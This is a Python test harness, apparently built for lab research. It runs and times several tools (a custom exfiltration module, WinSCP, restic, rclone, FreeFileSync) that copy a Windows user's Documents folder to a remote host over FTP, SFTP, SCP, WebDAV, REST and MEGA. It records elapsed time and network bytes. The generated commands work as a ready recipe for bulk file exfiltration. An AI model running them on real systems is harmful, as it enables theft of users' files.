# Run and time each of the exfiltration tools
import time
import syntheticExfil as sef
import subprocess
import csv
import os
import psutil
import random

def fileZillaTest(protocol):

    # Filezilla does not support command line use native Windows ftp and sftp functions
    # no native windows ftps
    ...

    return

def WinSCPTest(protocol, user, password, include):
    
    includeList = []
    if include != "":

        with open(include, 'r') as file:
            lines=file.readlines()
            for line in lines:
                if not line.startswith('#'):
                    includeList.append(line.strip())

        file.close()

    # write file winscpscript.txt containing the script to be executed

    winscpscriptfile = open('winscpScript.txt','w')

    destination = ""

    match protocol:
        case 'ftp':
            winscpscriptfile.write('open ftp://'+user+':'+password+'@ubuntuTarget/\n')
        case 'ftps':
            winscpscriptfile.write('open ftps://'+user+':'+password+'@ubuntuTarget/ -hostkey=* -explicittls\n')
        case 'sftp':
            winscpscriptfile.write('open sftp://'+user+':'+password+'@ubuntuTarget/ -hostkey=*\n')
            destination = 'sftp'
        case 'webdav':
            winscpscriptfile.write('open http://ubuntuTarget/webdav/ -hostkey=*\n')    
        case 'scp':
            winscpscriptfile.write('open scp://'+user+':'+password+'@ubuntuTarget/ -hostkey=*\n')
            destination = 'scp'

    if include == "":
        winscpscriptfile.write(r'put %USERPROFILE%\documents\* ./'+destination+r'/')
    else:
        for i in includeList:
            winscpscriptfile.write(r'put %USERPROFILE%\documents\* ./'+destination+r'/ -filemask=*'+i+' -rawtransfersettings ExcludeEmptyDirectories=1\n')

    winscpscriptfile.write('\n')
    winscpscriptfile.write('exit\n')

    winscpscriptfile.close()

    WinSCPCommand = 'winscp /ini=nul /log=winscp.log /script=winscpScript.txt'
    x=subprocess.run(WinSCPCommand,shell=True,capture_output=True,text=True)
 
    if x.stderr != "":
        print('winscp stderr:', x.stderr)

    return

def resticTest(protocol, user, password, sourceDirectory, include):

    match protocol:
        
        case 'sftp':
            resticCommand = 'restic -r sftp:'+user+'@ubuntuTarget:/home/'+user+'/sftp/restic-repo init --insecure-no-password'
            x=subprocess.run(resticCommand,shell=True,capture_output=True,text=True)
           
            if x.stderr != "":
                print('restic sftp repository init error, stderr:', x.stderr)

            resticCommand = 'restic -r sftp:'+user+'@ubuntuTarget:/home/'+user+'/sftp/restic-repo backup --verbose --insecure-no-password '

            if include == "":
                resticCommand = resticCommand + sourceDirectory
            else:
                resticCommand = resticCommand + '--files-from includeReformat.txt'
            print('Restic command:', resticCommand)
            x=subprocess.run(resticCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('restic sftp repository backup error, stderr:', x.stderr)

        case 'rest':
            # Create a restic reposityr. If it already exisst we can ignroe the error
            resticCommand = 'restic -r rest:http://ubuntuTarget:8000/ init --insecure-no-password'
            print('Restic init command:', resticCommand)
            x=subprocess.run(resticCommand,shell=True,capture_output=True,text=True)

            # if x.stderr != "":
            #    print('restic rest repository init error, stderr:', x.stderr)

            # Remove any existing backups and snapshots 
            resticCommand = 'restic -r rest:http://ubuntuTarget:8000/ forget --tag SEFHarness --insecure-no-password --unsafe-allow-remove-all --prune'
            x=subprocess.run(resticCommand,shell=True,capture_output=True,text=True)

            if x.stderr != "":
                print('restic rest repository init error, stderr:', x.stderr)

            resticCommand = 'restic -r rest:http://ubuntuTarget:8000/ backup --verbose --insecure-no-password --tag SEFHarness '

            if include == "":
                resticCommand = resticCommand + sourceDirectory
            else:
                resticCommand = resticCommand + '--files-from includeReformat.txt'
            print('Restic command:', resticCommand)
            x=subprocess.run(resticCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('restic rest repository backup error, stderr:', x.stderr)

        case _:
            print('Not supported restic protocol specified:', protocol)

    return

def rcloneTest(protocol, sourceDirectory, include):

    includeParameter = ""
    if include != "":

        includeParameter = '"*{'
        with open(include, 'r') as file:
            lines=file.readlines()
            for line in lines:
                if not line.startswith('#'):
                    includeParameter= includeParameter+line.strip()+','

        file.close()
        includeParameter = includeParameter.strip(',')+'}"'
        
    match protocol:
        case 'ftp':
            if include == "":
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ftp: --skip-links'
            else:
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ftp: --skip-links --ignore-case --include '+ includeParameter
            
            x=subprocess.run(rcloneCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('rclone ', protocol, ' copy error, stderr:', x.stderr)
        
        case 'ftps':

            if include == "":
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ' + protocol + ': --skip-links'
            else:
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ' + protocol + ': --skip-links --ignore-case --include '+ includeParameter
            
            print("Rclone command:",rcloneCommand)

            x=subprocess.run(rcloneCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('rclone ', protocol, ' copy error, stderr:', x.stderr)
        case 'sftp':

            if include == "":
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ' + protocol + ':.\\' + protocol + ' --skip-links'
            else:
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ ' + protocol + ':.\\' + protocol + ' --skip-links --ignore-case --include '+ includeParameter
            
            print("Rclone command:",rcloneCommand)

            x=subprocess.run(rcloneCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('rclone ', protocol, ' copy error, stderr:', x.stderr)
        case 'mega':
            if include == "":
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ mega:/testHarness --skip-links'
            else:
                rcloneCommand = 'rclone copy ' + sourceDirectory +'\\ mega:/testHarness --skip-links --ignore-case --include '+ includeParameter

            x=subprocess.run(rcloneCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('rclone mega copy  error, stderr:', x.stderr)
        case _:
            print('Not supported rclone:', protocol)
    return

def freeFileSyncTest(protocol, include):

    # Assumes existence of freefilesync batch file named ftpBatchrun.ffs_batch, sftpBatchrun.ffs_batch,
    # ftpBatchrunInclude.ffs_batch and sftpBatchrunInclude.ffs_batch. Include harcoded to .docx and .pptx

    includeString = ""
    if include != "":
        includeString = "Include"
        print("Warning freefilesync include input hardcoded as .docx and .pptx")

    match protocol:
        case 'ftp' | 'sftp' | 'ftps':
            freeFileSyncCommand = 'freefilesync '+protocol+'BatchRun'+includeString+'.ffs_batch'
            print('freefilesync command:',freeFileSyncCommand)
            x=subprocess.run(freeFileSyncCommand,shell=True,capture_output=True,text=True)
            
            if x.stderr != "":
                print('FreeFileSync error, protocol', protocol, ' stderr:', x.stderr)

        case _:
            print('FreeFilesync protocol', protocol, 'not supported.')

    return

def resetTargetFiles(user, password):
    # Reset exfiltration target file system
    reset = "plink -ssh ubuntuTarget -l "+user+" -pw "+password+" -no-antispoof '/home/"+user+"/reset.sh'"
    x=subprocess.run(reset,shell=True,capture_output=True,text=True)

    if x.stderr == "":
        print('\nSuccesful reset of files on target.')
    else:
        print('reset.sh on ubuntuTarget,stderr:', x.stderr)

    return

def reformatIncludeFile(include, sourceDirectory):
    
    # open include file and rewrite with a leading *

    outputfile = open('includeReformat.txt', 'w')
    outputfile.write('# written from testharness.py\n')

    with open(include, 'r') as inputFile:
        inputLines = inputFile.readlines()

        for inputLine in inputLines:
            if inputLine.startswith('#'):
                outputfile.write(inputLine)
            else:
                outputfile.write(sourceDirectory+'\\*'+inputLine)

    inputFile.close()
    outputfile.close()

    return

def main():
    sourceDirectory = os.environ['USERPROFILE']+'\\Documents'

    testCaseFile = open('testCaseFile9.csv')
    testCaseDictReader = csv.DictReader(testCaseFile)

    testOutputFile = open('SEFOutput.csv','a', newline='')
    testOutputWriter = csv.writer(testOutputFile)

    print ('Start run:',time.strftime('%d-%m-%Y %H:%M:%S',time.localtime(time.time())))
    print('Test file:', testCaseFile.name)
           
    for testCase in testCaseDictReader:
        resetTargetFiles(testCase['user'], testCase['password'])

        if testCase['include'] != "":
            reformatIncludeFile(testCase['include'], sourceDirectory)
        
        startNetBytes = psutil.net_io_counters()
        startTime=time.time()
        
        match testCase['tool']:
            case 'sef':
                sef.dataExfiltration(testCase['protocol'], testCase['target'], testCase['user'], testCase['password'], testCase['source'], testCase['include'])
            case 'winscp':
                WinSCPTest(testCase['protocol'], testCase['user'], testCase['password'], testCase['include'])
            case 'restic':
                resticTest(testCase['protocol'], testCase['user'], testCase['password'], sourceDirectory, testCase['include'])
            case 'rclone':
                rcloneTest(testCase['protocol'], sourceDirectory, testCase['include'])
            case 'freefilesync':
                freeFileSyncTest(testCase['protocol'],testCase['include'])
            case _:
                print('Not implemented, test #'+str(testCaseDictReader.line_num - 1), testCase)
                continue

        endTime =time.time()
        endNetBytes = psutil.net_io_counters()
        bytesSent = endNetBytes.bytes_sent - startNetBytes.bytes_sent
        bytesRecv = endNetBytes.bytes_recv - startNetBytes.bytes_recv

        s = time.localtime(startTime)
        e = time.localtime(endTime)
        print('Test #'+str(testCaseDictReader.line_num - 1)+ 
              ',tool:'+testCase['tool']+ 
              ',protocol:'+testCase['protocol']+
              ',target:'+testCase['target']+ 
              ",user:'*****'"+
              ",password:'*****'"+ 
              ',source:'+testCase['source']+
              ',include:'+testCase['include'])
        print('Start:\t\t\t\t\t',time.strftime('%Y-%m-%d %H:%M:%S', s))
        print('End:\t\t\t\t\t',time.strftime('%Y-%m-%d %H:%M:%S', e))
        print('Elapsed (s):\t\t\t',round(endTime-startTime,2))
        print('Bytes sent (MB):\t\t', round(bytesSent / 1024 / 1024,2))
        print('Bytes received (MB):\t', round(bytesRecv / 1024 / 1024,2))
        
        testOutputWriter.writerow([str(testCaseDictReader.line_num - 1),
            testCase['tool'],
            testCase['protocol'],
            testCase['include'],
            time.strftime('%Y-%m-%d', s),
            time.strftime('%H:%M:%S', s),
            time.strftime('%Y-%m-%d', e),
            time.strftime('%H:%M:%S', e),
            round(endTime-startTime,2),
            round(bytesSent / 1024 / 1024,2),
            round(bytesRecv / 1024 / 1024,2)])
        
    print('End of run.\n')

    testOutputFile.close()

    return

main()